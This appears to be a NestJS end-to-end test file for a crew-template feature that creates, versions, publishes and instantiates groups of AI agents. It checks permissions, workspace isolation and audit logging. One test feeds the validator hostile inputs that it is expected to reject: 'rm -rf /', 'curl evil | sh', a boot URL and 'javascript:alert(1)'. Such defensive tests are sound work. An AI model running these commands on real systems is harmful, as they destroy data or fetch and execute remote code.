import type { INestApplication } from '@nestjs/common';
import { createTestApp, prismaOf } from './utils/app';
import { addMember, registerOwner, type Session } from './utils/fixtures';

interface Plantilla {
  id: string;
  nombre: string;
  estado: 'BORRADOR' | 'PUBLICADA' | 'RETIRADA';
  versiones?: { id: string; version: number; publicadaAt: string | null; miembros: { id: string; rol: string }[] }[];
}

interface Version {
  id: string;
  version: number;
  miembros: { id: string; rol: string; cargoId: string | null }[];
}

interface Instancia {
  instancia: { id: string; plantillaId: string; versionId: string; agentesCreados: string[]; orgUnitId: string | null };
  agentesCreados: string[];
  permisosPendientes: {
    agentId: string;
    rol: string;
    skills: string[];
    conectoresSugeridos: unknown;
  }[];
  aviso: string;
}

/** Forma laxa de un miembro en las pruebas (todos los campos opcionales salvo el rol). */
type MiembroInput = {
  rol: string;
  nivelEsperado?: string;
  skills?: string[];
  conectoresSugeridos?: unknown[];
  politicaSugerida?: Record<string, unknown>;
  criteriosResultado?: Record<string, unknown>;
  delegaA?: string[];
};

/** Miembros declarativos de ejemplo: cargo + skills + conectores sugeridos + política + criterios + delegación. */
function miembrosValidos(): MiembroInput[] {
  return [
    {
      rol: 'Líder de cobranza',
      nivelEsperado: 'LIDER',
      skills: ['skill-negociacion'],
      conectoresSugeridos: [{ connectorId: 'conn-crm', operationId: 'op-listar', modo: 'USE' }],
      politicaSugerida: { limiteDiario: 50, requiereAprobacion: true },
      criteriosResultado: {
        reglaValidacion: { rules: [{ left: '{{ cobro.ok }}', operator: 'eq', right: true }] },
        evidenciaExigida: ['recibo'],
      },
      delegaA: ['Auxiliar de cobranza'],
    },
    {
      rol: 'Auxiliar de cobranza',
      nivelEsperado: 'EMPLEADO',
      skills: ['skill-registro'],
      conectoresSugeridos: [{ connectorId: 'conn-erp', operationId: 'op-crear' }],
    },
  ];
}

/**
 * E11 · Cuadrillas (ADR 0014, Incremento 3). Verifica el recorrido crear(BORRADOR)->versión->publicar->instanciar;
 * versiones append-only; el validador declarativo rechaza hooks/código/URL de arranque (400); solo PUBLICADA se
 * instancia; instanciar NO concede acceso (permisos pendientes + agente en DRAFT sin shares/tools); RETIRAR no rompe
 * instancias; aislamiento multi-tenant; roles (VIEWER/EDITOR); y que cada operación deja entrada en AuditLog.
 */
describe('Cuadrillas E11 (e2e)', () => {
  let app: INestApplication;
  let owner: Session;

  beforeAll(async () => {
    app = await createTestApp();
    owner = await registerOwner(app, 'e11-owner');
  });

  afterAll(async () => {
    await app.close();
  });

  async function crearPlantilla(s: Session, nombre = 'Cuadrilla de cobranza'): Promise<Plantilla> {
    return (
      await s.api.post('/crews', { nombre, proposito: 'Recuperar cartera', procesoObjetivo: 'Cobranza' }).expect(201)
    ).body as Plantilla;
  }

  async function agregarVersion(
    s: Session,
    plantillaId: string,
    miembros: MiembroInput[] = miembrosValidos(),
  ): Promise<Version> {
    return (await s.api.post(`/crews/${plantillaId}/versions`, { definicion: { notas: 'v' }, miembros }).expect(201))
      .body as Version;
  }

  it('recorrido completo: crear BORRADOR -> versión con miembros -> publicar -> instanciar', async () => {
    const p = await crearPlantilla(owner);
    expect(p.estado).toBe('BORRADOR');

    const v = await agregarVersion(owner, p.id);
    expect(v.version).toBe(1);
    expect(v.miembros).toHaveLength(2);

    // No se puede instanciar en BORRADOR (solo PUBLICADA).
    await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(409);

    const publicada = (await owner.api.post(`/crews/${p.id}/publish`).expect(201)).body as Plantilla;
    expect(publicada.estado).toBe('PUBLICADA');
    expect(publicada.versiones?.[0].publicadaAt).not.toBeNull();

    const inst = (await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(201)).body as Instancia;
    expect(inst.instancia.versionId).toBe(v.id);
    expect(inst.agentesCreados).toHaveLength(2);
    expect(inst.instancia.agentesCreados).toHaveLength(2);

    // La instancia queda listada en la trazabilidad de la plantilla.
    const instancias = (await owner.api.get(`/crews/${p.id}/instances`).expect(200)).body as { id: string }[];
    expect(instancias.some((i) => i.id === inst.instancia.id)).toBe(true);
  });

  it('publicar exige una versión válida: una plantilla sin versiones no se publica (409)', async () => {
    const p = await crearPlantilla(owner, 'Sin versiones');
    await owner.api.post(`/crews/${p.id}/publish`).expect(409);
  });

  it('versiones append-only: una versión nueva NO reescribe la anterior', async () => {
    const p = await crearPlantilla(owner, 'Append-only');
    const v1 = await agregarVersion(owner, p.id, [{ rol: 'Rol A' }]);
    const v2 = await agregarVersion(owner, p.id, [{ rol: 'Rol B' }, { rol: 'Rol C' }]);

    expect(v1.version).toBe(1);
    expect(v2.version).toBe(2);
    expect(v2.id).not.toBe(v1.id);

    const detalle = (await owner.api.get(`/crews/${p.id}`).expect(200)).body as Plantilla;
    expect(detalle.versiones).toHaveLength(2);
    const leidaV1 = detalle.versiones!.find((x) => x.id === v1.id)!;
    expect(leidaV1.version).toBe(1);
    expect(leidaV1.miembros.map((m) => m.rol)).toEqual(['Rol A']);
  });

  it('el validador declarativo RECHAZA una versión con hooks / código / URL de arranque (400)', async () => {
    const p = await crearPlantilla(owner, 'Maliciosa');

    // Hook en la política sugerida de un miembro.
    await owner.api
      .post(`/crews/${p.id}/versions`, {
        miembros: [{ rol: 'x', politicaSugerida: { hooks: { onInstall: 'rm -rf /' } } }],
      })
      .expect(400);
    // Código ejecutable en una clave prohibida de la definición de la versión.
    await owner.api
      .post(`/crews/${p.id}/versions`, { definicion: { script: 'curl evil | sh' }, miembros: [{ rol: 'x' }] })
      .expect(400);
    // URL de arranque.
    await owner.api
      .post(`/crews/${p.id}/versions`, {
        miembros: [{ rol: 'x', criteriosResultado: { startupUrl: 'https://evil/boot' } }],
      })
      .expect(400);
    // Contenido ejecutable en un valor de texto.
    await owner.api
      .post(`/crews/${p.id}/versions`, { miembros: [{ rol: 'x', politicaSugerida: { nota: 'javascript:alert(1)' } }] })
      .expect(400);

    // Ninguna versión maliciosa se persistió.
    const detalle = (await owner.api.get(`/crews/${p.id}`).expect(200)).body as Plantilla;
    expect(detalle.versiones).toHaveLength(0);
  });

  it('instanciar NO concede acceso: agentes en BORRADOR sin shares/tools/skills y permisos pendientes', async () => {
    const p = await crearPlantilla(owner, 'No concede');
    await agregarVersion(owner, p.id);
    await owner.api.post(`/crews/${p.id}/publish`).expect(201);

    const inst = (await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(201)).body as Instancia;
    expect(inst.aviso).toContain('NO concede acceso');
    expect(inst.permisosPendientes).toHaveLength(2);
    expect(inst.permisosPendientes[0].conectoresSugeridos).toBeDefined();

    // Cada agente creado está en DRAFT y SIN permisos concedidos: ni shares, ni tools, ni skills.
    for (const agentId of inst.agentesCreados) {
      const agent = await prismaOf(app).agent.findFirst({
        where: { id: agentId, workspaceId: owner.workspaceId },
        include: { shares: true, tools: true, skills: true },
      });
      expect(agent).not.toBeNull();
      expect(agent!.launchStatus).toBe('DRAFT');
      expect(agent!.shares).toHaveLength(0);
      expect(agent!.tools).toHaveLength(0);
      expect(agent!.skills).toHaveLength(0);
    }
  });

  it('instanciar vincula el responsable humano por rol cuando el DTO lo trae', async () => {
    const p = await crearPlantilla(owner, 'Con responsable');
    await agregarVersion(owner, p.id, [{ rol: 'Rol Resp' }]);
    await owner.api.post(`/crews/${p.id}/publish`).expect(201);

    const inst = (
      await owner.api
        .post(`/crews/${p.id}/instantiate`, { responsables: [{ rol: 'Rol Resp', responsableUserId: owner.userId }] })
        .expect(201)
    ).body as Instancia;
    const agent = await prismaOf(app).agent.findFirst({ where: { id: inst.agentesCreados[0] } });
    expect(agent!.responsableUserId).toBe(owner.userId);
  });

  it('RETIRAR deja de ofrecer la plantilla pero NO rompe las instancias existentes', async () => {
    const p = await crearPlantilla(owner, 'A retirar');
    await agregarVersion(owner, p.id);
    await owner.api.post(`/crews/${p.id}/publish`).expect(201);
    const inst = (await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(201)).body as Instancia;

    const retirada = (await owner.api.post(`/crews/${p.id}/retire`).expect(201)).body as Plantilla;
    expect(retirada.estado).toBe('RETIRADA');

    // Ya no se puede instanciar una RETIRADA...
    await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(409);
    // ...pero la instancia previa y sus agentes siguen existiendo.
    const instancias = (await owner.api.get(`/crews/${p.id}/instances`).expect(200)).body as { id: string }[];
    expect(instancias.some((i) => i.id === inst.instancia.id)).toBe(true);
    const agent = await prismaOf(app).agent.findFirst({ where: { id: inst.agentesCreados[0] } });
    expect(agent).not.toBeNull();
  });

  it('aísla por workspace: otro workspace no ve ni instancia la plantilla (404)', async () => {
    const p = await crearPlantilla(owner, 'Privada');
    await agregarVersion(owner, p.id);
    await owner.api.post(`/crews/${p.id}/publish`).expect(201);

    const otro = await registerOwner(app, 'e11-otro');
    await otro.api.get(`/crews/${p.id}`).expect(404);
    await otro.api.post(`/crews/${p.id}/instantiate`, {}).expect(404);
    await otro.api.post(`/crews/${p.id}/versions`, { miembros: [{ rol: 'x' }] }).expect(404);
    // El catálogo del otro workspace no incluye la plantilla ajena.
    const catalogo = (await otro.api.get('/crews').expect(200)).body as Plantilla[];
    expect(catalogo.some((c) => c.id === p.id)).toBe(false);
  });

  it('roles: un VIEWER no crea ni instancia; un EDITOR instancia pero no crea; ADMIN crea', async () => {
    const admin = await addMember(app, owner, { role: 'ADMIN', tag: 'e11-admin' });
    const editor = await addMember(app, owner, { role: 'EDITOR', tag: 'e11-editor' });
    const viewer = await addMember(app, owner, { role: 'VIEWER', tag: 'e11-viewer' });

    // ADMIN crea, versiona y publica.
    const p = await crearPlantilla(admin, 'Gobernada por rol');
    await agregarVersion(admin, p.id);
    await admin.api.post(`/crews/${p.id}/publish`).expect(201);

    // VIEWER no crea ni instancia (pero sí lee el catálogo).
    await viewer.api.post('/crews', { nombre: 'x' }).expect(403);
    await viewer.api.post(`/crews/${p.id}/instantiate`, {}).expect(403);
    await viewer.api.get(`/crews/${p.id}`).expect(200);

    // EDITOR no crea/publica, pero sí instancia.
    await editor.api.post('/crews', { nombre: 'x' }).expect(403);
    await editor.api.post(`/crews/${p.id}/publish`).expect(403);
    await editor.api.post(`/crews/${p.id}/instantiate`, {}).expect(201);
  });

  it('cada operación deja su entrada en el AuditLog (actor humano, plantilla y versión)', async () => {
    const p = await crearPlantilla(owner, 'Auditada');
    await agregarVersion(owner, p.id);
    await owner.api.post(`/crews/${p.id}/publish`).expect(201);
    const inst = (await owner.api.post(`/crews/${p.id}/instantiate`, {}).expect(201)).body as Instancia;
    await owner.api.post(`/crews/${p.id}/retire`).expect(201);

    const creada = (await owner.api.get(`/auditoria?action=CUADRILLA_CREADA&targetId=${p.id}`).expect(200)).body as {
      items: { actorType: string; actorId: string }[];
    };
    expect(creada.items).toHaveLength(1);
    expect(creada.items[0].actorType).toBe('USER');
    expect(creada.items[0].actorId).toBe(owner.userId);

    const publicada = (await owner.api.get(`/auditoria?action=CUADRILLA_PUBLICADA&targetId=${p.id}`).expect(200))
      .body as {
      items: { metadata: { versionId: string } }[];
    };
    expect(publicada.items).toHaveLength(1);
    expect(publicada.items[0].metadata.versionId).toBeDefined();

    const instanciada = (
      await owner.api.get(`/auditoria?action=CUADRILLA_INSTANCIADA&targetId=${inst.instancia.id}`).expect(200)
    ).body as { items: unknown[] };
    expect(instanciada.items).toHaveLength(1);

    const retirada = (await owner.api.get(`/auditoria?action=CUADRILLA_RETIRADA&targetId=${p.id}`).expect(200))
      .body as {
      items: unknown[];
    };
    expect(retirada.items).toHaveLength(1);
  });
});
